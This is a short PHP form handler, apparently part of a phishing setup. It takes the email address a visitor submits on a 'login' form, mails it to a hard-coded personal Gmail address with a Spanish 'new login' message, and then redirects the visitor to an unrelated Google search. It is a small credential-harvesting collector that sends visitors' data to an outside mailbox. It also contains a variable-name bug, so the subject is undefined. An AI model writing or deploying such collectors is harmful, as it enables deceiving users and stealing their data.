<?php

$email = $_POST['email'];
$Asunto = 'nuevp inicio de sesion en el formulario';
$contenido = "Se ha iniciado sesion en el formulario con el Correo Electronico: $email";
$destinatario = 'ismelgomez45@gmail.com';

mail($destinatario, $asunto , $contenido);

header("location:https://www.google.com/search?q=nelzon+por+toterias+de+mi+vida&oq=nelzon+por+toterias+de+mi+vida&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIICAEQABgWGB7SAQkyOTY0OGowajeoAgCwAgA&sourceid=chrome&ie=UTF-8#");

exit;

	?>
